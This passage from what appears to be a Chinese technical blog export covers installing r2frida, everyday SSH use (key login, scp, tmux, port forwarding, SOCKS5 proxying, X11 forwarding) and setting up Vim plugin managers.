<p>使用 r2pn 安装 r2frida </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2pm -ci r2frida</span><br></pre></td></tr></table></figure>
<p>如果出现 <code>$R2PM_DBDIR: No such file or directory.</code> 错误，运行 <code>r2pm init</code> 初始化一下。</p>
<img src="/2019/12/21/r2Frida%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/2019-12-22-00-14-37.png" class="">

]]></content>
      <categories>
        <category>frida</category>
      </categories>
      <tags>
        <tag>radare2 frida</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh基本使用</title>
    <url>/2019/12/14/ssh%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>转载：<a href="https://abcdabcd987.com/ssh/">https://abcdabcd987.com/ssh/</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#%E7%BA%A6%E5%AE%9A">约定</a></li>
<li><a href="#%E5%9F%BA%E7%A1%80">基础</a></li>
<li><a href="#%E5%AE%89%E8%A3%85-openssh-server">安装 OpenSSH Server</a></li>
<li><a href="#%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5">免密码登入</a></li>
<li><a href="#%E9%85%8D%E7%BD%AE%E5%88%AB%E5%90%8D">配置别名</a></li>
<li><a href="#%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6">传输文件</a></li>
<li><a href="#%E4%BF%9D%E6%8C%81%E7%A8%8B%E5%BA%8F%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C">保持程序在后台运行</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BE%8B%E5%AD%901">反向端口转发：例子1</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BE%8B%E5%AD%902">反向端口转发：例子2</a></li>
<li><a href="#%E5%8F%8D%E5%90%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%BE%8B%E5%AD%903">反向端口转发：例子3</a></li>
<li><a href="#%E6%AD%A3%E5%90%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">正向端口转发</a></li>
<li><a href="#%E7%94%A8%E4%BD%9C-socks5-%E4%BB%A3%E7%90%86">用作 SOCKS5 代理</a></li>
<li><a href="#%E4%BC%A0%E9%80%92%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2">传递图形界面</a></li>
</ul>
<!-- /TOC -->

<h1 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h1><p>本文不讲解 Linux 使用方法，只讲解机器之间的通信方法。<br>下文中行首的 local$ 以及 remote$ 等为命令行的提示符，不是输入的内容，用于区分当前是在哪台机子上。</p>
<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>在 Linux 系统上 SSH 是非常常用的工具，通过 SSH Client 我们可以连接到运行了 SSH Server 的远程机器上。SSH Client 的基本使用方法是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh user@remote -p port</span><br></pre></td></tr></table></figure>
<ul>
<li>user 是你在远程机器上的用户名，如果不指定的话默认为当前用户</li>
<li>remote 是远程机器的地址，可以是 IP，域名，或者是后面会提到的别名</li>
<li>port 是 SSH Server 监听的端口，如果不指定的话就为默认值 22</li>
</ul>
<p>实际上，知道了上面这三个参数，用任意的 SSH Client 都能连接上 SSH Server，例如在 Windows 上 PuTTY 就是很常用的 SSH Client。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh user@remote -p port</span><br><span class="line">user@remote&#x27;s password:</span><br></pre></td></tr></table></figure>
<p>在执行了 ssh 命令之后，远程机器会询问你的密码。在输入密码的时候，屏幕上不会显示明文密码，也不会显示 <code>******</code>，这样别人就不会看到你的密码长度了，按下回车即可登入。</p>
<p>登入之后，你就可以操作远程机器啦！</p>
<h1 id="安装-OpenSSH-Server"><a href="#安装-OpenSSH-Server" class="headerlink" title="安装 OpenSSH Server"></a>安装 OpenSSH Server</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh user@remote -p port </span><br><span class="line">ssh: connect to host remote port 22: Connection refused</span><br></pre></td></tr></table></figure>
<p>如果你遇到了上面的消息，说明在远程机器上没有安装 <code>SSH Server</code>，特别地，如果远程机器运行的是 <code>Ubuntu Desktop</code> 系统，那么默认是没有安装 <code>SSH Server</code> 的。这个时候，你可以联系管理员让他安装 <code>SSH Server</code>，或者如果你有 <code>sudo</code> 权限的话，可以执行下面命令安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span><br></pre></td></tr></table></figure>

<h1 id="免密码登入"><a href="#免密码登入" class="headerlink" title="免密码登入"></a>免密码登入</h1><p>每次 <code>ssh</code> 都要输入密码是不是很烦呢？与密码验证相对的，是公钥验证。也就是说，要实现免密码登入，首先要设置 <code>SSH</code> 钥匙。</p>
<p>执行 <code>ssh-keygen</code> 即可生成 <code>SSH</code> 钥匙，一路回车即可。<code>Windows</code> 用户可以使用 <code>PuTTY</code> 配套的 <code>PuTTYgen</code> 工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/home/user/.ssh/id_rsa):</span><br><span class="line">Created directory &#x27;/home/user/.ssh&#x27;.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /home/user/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /home/user/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:47VkvSjlFhKRgz/6RYdXM2EULtk9TQ65PDWJjYC5Jys user@local</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|       ...o...X+o|</span><br><span class="line">|      . o+   B=Oo|</span><br><span class="line">|       .....ooo*=|</span><br><span class="line">|        o+ooo.+ .|</span><br><span class="line">|       .SoXo.  . |</span><br><span class="line">|      .E X.+ .   |</span><br><span class="line">|       .+.= .    |</span><br><span class="line">|        .o       |</span><br><span class="line">|                 |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure>
<p>这段话告诉了我们，生成的公钥放在了 <code>~/.ssh/id_rsa.pub</code>，私钥放在了 <code>~/.ssh/id_rsa</code>。接下来，我们要让远程机器记住我们的公钥。最简单的方法是 <code>ssh-copy-id user@remote -p port</code> .</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh-copy-id user@remote -p port</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/home/user/.ssh/id_rsa.pub&quot;</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">user@remote&#x27;s password:</span><br><span class="line"></span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;user@remote&#x27; -p port&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br></pre></td></tr></table></figure>
<p><code>ssh-copy-id</code> 在绝大多数发行版上都有预装，在 <code>Mac</code> 上也可以通过 <code>brew install ssh-copy-id</code> 一键安装。</p>
<p>在没有 <code>ssh-copy-id</code> 的情况下（比如在 <code>Windows</code> 上），也是可以轻松做到这件事的。用命令的话也是一句话搞定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh user@remote -p port &#x27;mkdir -p .ssh &amp;&amp; cat &gt;&gt; .ssh/authorized_keys&#x27; &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>这句话的意思是，在远端执行新建 <code>.ssh</code> 文件夹，并把本地的 <code>~/.ssh/id_rsa.pub</code> （也就是公钥）追加到远端的 <code>.ssh/authorized_keys</code> 中。当然，不使用这条命令的话，你也可以手动操作这个过程，即先复制公钥，再登入远程机器，粘贴到 <code>.ssh/authorized_keys</code> 当中。</p>
<p>在完成这一步之后，ssh 进入远程机器时就不用输入密码了。Windows 用户在 PuTTY 上面设置登入用户名和 PuTTYgen 生成的私钥之后也可以免密码登入。</p>
<h1 id="配置别名"><a href="#配置别名" class="headerlink" title="配置别名"></a>配置别名</h1><p>每次都输入 <code>ssh user@remote -p port</code>，时间久了也会觉得很麻烦，特别是当 <code>user</code>, <code>remote</code> 和 <code>port</code> 都得输入，而且还不好记忆的时候。配置别名可以让我们进一步偷懒。</p>
<p>比如我想用 <code>ssh lab</code> 来替代上面这么一长串，那么在 <code>~/.ssh/config</code> 里面追加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host lab</span><br><span class="line">    HostName remote</span><br><span class="line">    User user</span><br><span class="line">    Port port</span><br></pre></td></tr></table></figure>
<p>保存之后，即可用 <code>ssh lab</code> 登入，如果还配置了公钥登入，那就连密码都不用输入了。</p>
<p><code>Windows</code> 用户使用 <code>PuTTY</code> 直接保存配置即可。</p>
<h1 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h1><p>在两台机之间传输文件可以用 <code>scp</code>，它的地址格式与 <code>ssh</code> 基本相同，都是可以省略用户名和端口，稍微的差别在与指定端口时用的是大写的 <code>-P</code> 而不是小写的。不过，如果你已经配置了别名，那么这都不重要，因为 <code>scp</code> 也支持直接用别名。<code>scp</code> 用起来很简单，看看下面的例子就明白了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 把本地的 /path/to/local/file 文件传输到远程的 /path/to/remote/file</span><br><span class="line">scp -P port /path/to/local/file user@remote:/path/to/remote/file</span><br><span class="line"></span><br><span class="line"># 也可以使用别名</span><br><span class="line">scp /path/to/local/file lab:/path/to/remote/file</span><br><span class="line"></span><br><span class="line"># 把远程的 /path/to/remote/file 下载到本地的 /path/to/local/file</span><br><span class="line">scp lab:/path/to/remote/file /path/to/local/file</span><br><span class="line"></span><br><span class="line"># 远程的默认路径是家目录</span><br><span class="line"># 下面命令把当前目录下的 file 传到远程的 ~/dir/file</span><br><span class="line">scp file lab:dir/file</span><br><span class="line"></span><br><span class="line"># 加上 -r 命令可以传送文件夹</span><br><span class="line"># 下面命令可以把当前目录下的 dir 文件夹传到远程的家目录下</span><br><span class="line">scp -r dir lab:</span><br><span class="line"></span><br><span class="line"># 别忘了 . 可以用来指代当前目录</span><br><span class="line"># 下面命令可以把远程的 ~/dir 目录下载到当前目录里面</span><br><span class="line">scp -r lab:dir/ .</span><br></pre></td></tr></table></figure>
<p><code>Windows</code> 用户可以使用 <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html">PuTTY</a> 配套的 <code>PSCP</code>。</p>
<p>如果觉得使用命令行传输文件浑身不自在，你还可以使用 SFTP 协议。任何支持 SFTP 协议的客户端都能用你的 SSH 账号信息登入并管理文件，比如开源的有图形化界面的FTP客户端 <a href="https://filezilla-project.org/download.php?type=client">FileZilla</a>。别忘了，在这些客户端里面，你也可以指定你的私钥（<code>~/.ssh/id_rsa</code>），然后就能做到无密码登入了。</p>
<h1 id="保持程序在后台运行"><a href="#保持程序在后台运行" class="headerlink" title="保持程序在后台运行"></a>保持程序在后台运行</h1><p>有时候你想要在远程的机器上跑一个需要长时间运行的程序，比如一些计算，然后当你睡了一觉再登入远程的机子上却发现什么结果都没有。这是因为一旦 ssh 进程退出，所有它之前启动的程序都会被杀死。那么有什么办法可以保持程序在后台运行呢？</p>
<p>你需要在远程的机子上使用 <code>tmux</code>。<code>tmux</code> 是一个会话管理程序，他会保持程序一直运行着。在 Ubuntu 上你可以通过 <code>sudo apt-get install tmux</code> 来安装。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remote$ tmux</span><br></pre></td></tr></table></figure>
<p>这样你就进入到了 <code>tmux</code> 管理的会话中，之后你再运行任何东西都不会因为你退出 ssh 而被杀死。要暂时离开这个会话，可以先按下 <code>ctrl+b</code> 再按下 <code>d</code>。要恢复之前的会话，只需要执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remote$ tmux attach</span><br></pre></td></tr></table></figure>
<p><code>tmux</code> 还能管理多个窗口、水平竖直切分、复制粘贴等等，你可以看看<a href="http://blog.jobbole.com/87584/">这篇不错的文章</a>来入门。</p>
<p>如果你是Mac用户，那么十分幸运的是，你几乎不需要任何学习，只要把你的终端由系统自带的 <code>Terminal</code> 换成 <code>iTerm 2</code>。<code>iTerm 2</code> 自带超好的 <code>tmux</code> 支持，你可以像操作本机的标签页一样操作 <code>tmux</code> 会话。你只需要在新建会话的时候使用 <code>tmux -CC</code>，在恢复的时候使用 <code>tmux -CC attach</code> 即可。具体的可以参见 <a href="https://gitlab.com/gnachman/iterm2/wikis/TmuxIntegration">iTerm2 and tmux Integration</a>。</p>
<p>最后强调一遍，tmux 应该运行在远程的机子上，而不是本机上，否则程序在 ssh 退出时依然会被杀死。</p>
<h1 id="反向端口转发：例子1"><a href="#反向端口转发：例子1" class="headerlink" title="反向端口转发：例子1"></a>反向端口转发：例子1</h1><p>相信很多人都会有这样的需求：我实验室的机器和宿舍的机器都处在局域网中，但我需要在宿舍访问实验室的机器，或者反过来。这个时候，你需要一台处在公网的机器，如果没有的话，可以考虑腾讯云或者阿里云的学生优惠。</p>
<p>假设现在你有一台处在公网的机器 <code>jumpbox</code>，这台机器是在任何地方都能访问到的；你在实验室也有一台机子 <code>lab</code>，这台机子只能在实验室内部访问，但他可以访问公网，你希望能在任何地方都能访问这台机器。使用 <code>ssh -R</code> 可以轻松地做到这个事情。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lab$ ssh -R 10022:localhost:22 jumpbox</span><br><span class="line">jumpbox$ ssh user@localhost -p 10022</span><br><span class="line">lab$ </span><br></pre></td></tr></table></figure>
<p>如果上面这个过程成功了，就说明在你执行 <code>ssh -R 10022:localhost:22 jumpbox</code> 之后，你成功地将 <code>lab</code> 上的 22 端口反向转发到了 <code>jumpbox</code> 的 10022 端口。只要保持这个 <code>ssh</code> 不断，任何一台机器都可以首先连接到 <code>jumpbox</code>，然后通过 <code>ssh user@localhost -p 10022</code> 连回到 <code>lab</code>。可以看到，这里 <code>jumpbox</code> 起到了一个跳板的作用，所以我们把它称作跳板机。</p>
<p>不过上面这么做并不稳健，如果因为网络波动导致 <code>ssh -R</code> 那个连接断了，那么从 <code>jumpbox</code> 就完全失去了到 <code>lab</code> 的控制。万幸的是，有一个叫做 <code>autossh</code> 的软件，可以自动的检测断线，并在断线的时候重连。在 Ubuntu 上你可以使用 <code>sudo apt-get install autossh</code> 来安装，在 Mac 上则是 <code>brew install autossh</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lab$ autossh -NfR 10022:localhost:22 jumpbox</span><br></pre></td></tr></table></figure>
<p>上面这句话里面 <code>-N</code> 表示非不执行命令，只做端口转发；<code>-f</code> 表示在后台运行，也就是说，这句话执行之后 <code>autossh</code> 就在后台默默工作啦；<code>-R 10022:localhost:22</code> 就是把本地的22端口转发到远程的10022端口。</p>
<p>现在，任何一台电脑先连上跳板机，就可以连回内网的机子啦！</p>
<p>你甚至可以将这句话设置为开机时运行：在 <code>/etc/rc.local</code> 里面 <code>exit 0</code> 这句话之前加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - user -c autossh -NfR 10022:localhost:22 jumpbox</span><br></pre></td></tr></table></figure>
<p>其中 <code>user</code> 是你的用户名。需要注意的是，如果你需要开机时运行 <code>autossh</code>，你需要配置公钥登入，因为开机运行的时候是没有交互界面让你来输入密码的。</p>
<p>这里顺带说一句，你可以绑定1024到65535之间的任意端口，只要这个端口之前没有程序在用就行。</p>
<h1 id="反向端口转发：例子2"><a href="#反向端口转发：例子2" class="headerlink" title="反向端口转发：例子2"></a>反向端口转发：例子2</h1><p>还是反向端口转发，再举一个很常见的例子：我在本地跑了一个网站，我想临时把我的网站发给朋友看看。你可以很容易的复现这个实验：在本地运行 <code>python -m SimpleHTTPServer</code> 即可在本地的8000端口启动一个网站，你可以在浏览器中通过 <code>http://localhost:8000/</code> 看到。下面我们想让远方的朋友看到这个网站。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh -NR 0.0.0.0:18000:localhost:8000 jumpbox</span><br></pre></td></tr></table></figure>
<p>远方的朋友即可通过 <code>http://jumpbox:18000/</code> 看到了。注意到这里和上面的命令有一个小小的不同，就是多了 <code>0.0.0.0</code>，这告诉 <code>ssh</code>，要把18000端口绑定在远端的所有IP上。如果像之前那样省略的话，缺省值是只绑定在 <code>localhost</code>，也就是只有在 <code>jumpbox</code> 本机才可以访问，而其他人都不能访问。</p>
<h1 id="反向端口转发：例子3"><a href="#反向端口转发：例子3" class="headerlink" title="反向端口转发：例子3"></a>反向端口转发：例子3</h1><p>比方说在本地的<code>127.0.0.1:1080</code>运行了HTTP代理服务，现在我想让另一台机子 <code>remote</code> 也能够使用这个HTTP代理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh -NR 11080:localhost:1080 remote</span><br><span class="line">local$ ssh remote</span><br><span class="line">remote$ export http_proxy=http://127.0.0.1:11080/</span><br><span class="line">remote$ export https_proxy=http://127.0.0.1:11080/</span><br><span class="line">remote$ curl http://ifconfig.co</span><br></pre></td></tr></table></figure>
<p>看看返回的IP，是不是 <code>remote</code> 也用上了代理？</p>
<h1 id="正向端口转发"><a href="#正向端口转发" class="headerlink" title="正向端口转发"></a>正向端口转发</h1><p>反向端口转发是把本机的端口转发到远程的机子上；与之对应，正向端口转发则是把远程的端口转发到本地。</p>
<p>比方说，之前我们把 <code>lab</code> 的22端口反向转发到了 <code>jumpbox</code> 的10022端口，现在我想把它转发到本机的20022端口，只需要执行 <code>ssh -L</code> 就行了，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh -NL 20022:localhost:10022 jumpbox</span><br><span class="line">local$ ssh localhost -p 20022</span><br><span class="line">lab$ </span><br></pre></td></tr></table></figure>
<h1 id="用作-SOCKS5-代理"><a href="#用作-SOCKS5-代理" class="headerlink" title="用作 SOCKS5 代理"></a>用作 SOCKS5 代理</h1><p>要是想要在家访问公司内网的一些网站，但是公司又没有提供进入内网的VPN，那怎么办呢？通过 <code>ssh -D</code> 可以在本地建立起一个 <code>SOCKS5</code> 代理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh -ND 1080 workplace</span><br></pre></td></tr></table></figure>
<p>如果 <code>workplace</code> 处在内网，不要忘记前面讲到可以用反向端口转发和跳板机来解决这个问题。现在，你可以在浏览器的设置里面，把代理服务器设成 <code>socks5://127.0.0.1:1080</code>，然后你就可以看到 <code>workplace</code> 能看到的所有网站啦。</p>
<h1 id="传递图形界面"><a href="#传递图形界面" class="headerlink" title="传递图形界面"></a>传递图形界面</h1><p>上面我们都是在运行命令行程序，那如果远程有一些程序是不得不用图形界面的话，是不是无解了呢？实际上，恰恰相反，X11的设计天生就支持这样的行为。</p>
<p>首先，我们需要在本机装上 X Server：Linux 桌面用户本身就已经有了 X Server，Windows 用户可以使用 <a href="http://www.straightrunning.com/XmingNotes/">Xming</a>，Mac 用户需要使用 <a href="https://www.xquartz.org/">XQuartz</a> 。</p>
<p>安装好了 X Server 之后，我们通过 <code>ssh -X</code> 进行连接，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local$ ssh -X remote</span><br><span class="line">remote$ xeyes</span><br></pre></td></tr></table></figure>
<p>现在你应该会看到一对傻傻的眼睛，这就说明成功了，注意，这个眼睛是跑在远程的，而输入和输出都是在本地。这个方法几乎可以运行任何图形界面的程序，比如你可以试试看运行 <code>nautilus</code> 或者 <code>firefox</code>。</p>
<img src="/2019/12/14/ssh%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/2019-12-14-11-13-04.png" class="">]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>vim插件安装使用整理记录</title>
    <url>/2020/03/21/vim%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍:"></a>介绍:</h2><p>安装需要Git，触发git clone,默认将每一个指定特定格式插件的仓库复制到~&#x2F;.vim&#x2F;bundle&#x2F;. 搜索需要Curl支持。</p>
<p>Windows用户请直接访问Windows setup. 如果有任何问题, 请参考 FAQ. 查看 Tips 获取相关高级配置。</p>
<p>使用 non-POSIX shells, 比如比较流行对 Fish shell, 需要额外对步骤。 请查看 FAQ.</p>
<h2 id="初始安装-Vundle："><a href="#初始安装-Vundle：" class="headerlink" title="初始安装 Vundle："></a>初始安装 Vundle：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</span><br></pre></td></tr></table></figure>

<h2 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件 :"></a>配置插件 :</h2><p>请将以下加在 .vimrc 方可使用Vundle. 删掉你不需要的插件, 这些只是用做示例.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set nocompatible              &quot; 去除VI一致性,必须</span><br><span class="line">filetype off                  &quot; 必须</span><br><span class="line"></span><br><span class="line">&quot; 设置包括vundle和初始化相关的runtime path</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; 另一种选择, 指定一个vundle安装插件的路径</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line"></span><br><span class="line">&quot; 让vundle管理插件版本,必须</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line"></span><br><span class="line">&quot; 以下范例用来支持不同格式的插件安装.</span><br><span class="line">&quot; 请将安装插件的命令放在vundle#begin和vundle#end之间.</span><br><span class="line">&quot; Github上的插件</span><br><span class="line">&quot; 格式为 Plugin &#x27;用户名/插件仓库名&#x27;</span><br><span class="line">Plugin &#x27;tpope/vim-fugitive&#x27;</span><br><span class="line">&quot; 来自 http://vim-scripts.org/vim/scripts.html 的插件</span><br><span class="line">&quot; Plugin &#x27;插件名称&#x27; 实际上是 Plugin &#x27;vim-scripts/插件仓库名&#x27; 只是此处的用户名可以省略</span><br><span class="line">Plugin &#x27;L9&#x27;</span><br><span class="line">&quot; 由Git支持但不再github上的插件仓库 Plugin &#x27;git clone 后面的地址&#x27;</span><br><span class="line">Plugin &#x27;git://git.wincent.com/command-t.git&#x27;</span><br><span class="line">&quot; 本地的Git仓库(例如自己的插件) Plugin &#x27;file:///+本地插件仓库绝对路径&#x27;</span><br><span class="line">Plugin &#x27;file:///home/gmarik/path/to/plugin&#x27;</span><br><span class="line">&quot; 插件在仓库的子目录中.</span><br><span class="line">&quot; 正确指定路径用以设置runtimepath. 以下范例插件在sparkup/vim目录下</span><br><span class="line">Plugin &#x27;rstacruz/sparkup&#x27;, &#123;&#x27;rtp&#x27;: &#x27;vim/&#x27;&#125;</span><br><span class="line">&quot; 安装L9，如果已经安装过这个插件，可利用以下格式避免命名冲突</span><br><span class="line">Plugin &#x27;ascenator/L9&#x27;, &#123;&#x27;name&#x27;: &#x27;newL9&#x27;&#125;</span><br><span class="line"></span><br><span class="line">&quot; 你的所有插件需要在下面这行之前</span><br><span class="line">call vundle#end()            &quot; 必须</span><br><span class="line">filetype plugin indent on    &quot; 必须 加载vim自带和插件相应的语法和文件类型相关脚本</span><br><span class="line">&quot; 忽视插件改变缩进,可以使用以下替代:</span><br><span class="line">&quot;filetype plugin on</span><br><span class="line">&quot;</span><br><span class="line">&quot; 简要帮助文档</span><br><span class="line">&quot; :PluginList       - 列出所有已配置的插件</span><br><span class="line">&quot; :PluginInstall    - 安装插件,追加 `!` 用以更新或使用 :PluginUpdate</span><br><span class="line">&quot; :PluginSearch foo - 搜索 foo ; 追加 `!` 清除本地缓存</span><br><span class="line">&quot; :PluginClean      - 清除未使用插件,需要确认; 追加 `!` 自动批准移除未使用插件</span><br><span class="line">&quot;</span><br><span class="line">&quot; 查阅 :h vundle 获取更多细节和wiki以及FAQ</span><br><span class="line">&quot; 将你自己对非插件片段放在这行之后</span><br></pre></td></tr></table></figure>
<h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件:"></a>安装插件:</h2><p>运行 <code>vim</code> 再运行 <code>:PluginInstall</code></p>
<p>通过命令行直接安装 <code>vim +PluginInstall +qall</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:h vundle</span><br></pre></td></tr></table></figure>

<h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:PluginInstall</span><br><span class="line">:PluginUpdate</span><br><span class="line">:PluginSearch</span><br><span class="line">:PluginList</span><br><span class="line">:PluginClean</span><br></pre></td></tr></table></figure>

<h1 id="安装插件-1"><a href="#安装插件-1" class="headerlink" title="安装插件"></a>安装插件</h1><h2 id="安装-ctrlp-模糊搜索文件插件"><a href="#安装-ctrlp-模糊搜索文件插件" class="headerlink" title="安装 ctrlp 模糊搜索文件插件"></a>安装 ctrlp 模糊搜索文件插件</h2><p>打开 <code>.vimrc</code> 加入下面内容后，执行 <code>:PluginInstall</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Plugin &#x27;ctrlpvim/ctrlp.vim&#x27;</span><br></pre></td></tr></table></figure>
<p>ctrlp 插件使用</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>ctrl + p</td>
<td>开启文件搜索</td>
</tr>
<tr>
<td>F5</td>
<td>刷新当前目录内容</td>
</tr>
<tr>
<td>ctrl + f&#x2F;b</td>
<td>切换显示模式</td>
</tr>
<tr>
<td>ctrl + d</td>
<td>只搜索文件名</td>
</tr>
<tr>
<td>ctrl + r</td>
<td>正则查找模式</td>
</tr>
<tr>
<td>ctrl + j&#x2F;k</td>
<td>搜索结果中移动光标</td>
</tr>
<tr>
<td>ctrl + t</td>
<td>新标签页打开</td>
</tr>
<tr>
<td>ctrl + v&#x2F;x</td>
<td>垂直分割打开 &#x2F; 水平分割打开</td>
</tr>
<tr>
<td>ctrl + n&#x2F;p</td>
<td>上下翻阅上次搜索历史</td>
</tr>
<tr>
<td>ctrl + y</td>
<td>在选中文件的父级目录创建新文件</td>
</tr>
<tr>
<td>ctrl + z</td>
<td>标记选择多个文件</td>
</tr>
<tr>
<td>ctrl + o</td>
<td>选择打开方式</td>
</tr>
</tbody></table>
<h2 id="安装-vim-autoformat-自动格式化插件"><a href="#安装-vim-autoformat-自动格式化插件" class="headerlink" title="安装 vim-autoformat 自动格式化插件"></a>安装 vim-autoformat 自动格式化插件</h2><p><code>.vimrc</code> 中增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Plugin &#x27;Chiel92/vim-autoformat&#x27;</span><br></pre></td></tr></table></figure>
<p>增加快捷键配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">noremap &lt;F3&gt; :Autoformat&lt;CR&gt;</span><br></pre></td></tr></table></figure>
<p>增加对python代码的支持,安装autopep8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --upgrade autopep8</span><br></pre></td></tr></table></figure>
<p>按F3开启自动格式化。</p>
<h1 id="使用-LSP-插件"><a href="#使用-LSP-插件" class="headerlink" title="使用 LSP 插件"></a>使用 LSP 插件</h1><h2 id="安装-vim-plug"><a href="#安装-vim-plug" class="headerlink" title="安装 vim-plug"></a>安装 vim-plug</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
<p>如果由于网络问题，无法访问 <a href="https://raw.githubusercontent.com/">https://raw.githubusercontent.com</a> ，可以手动安装。</p>
<ol>
<li>下载 <code>plug.vim</code> 。</li>
<li>将 <code>plug.vim</code> 移动到 <code>~/.vim/autoload/plug.vim</code> 。</li>
</ol>
<p>安装成功后修改 <code>~/.vimrc</code> 声明插件安装，然后进入 VIM 中运行 <code>:PlugInstall</code> 命令安装插件。</p>
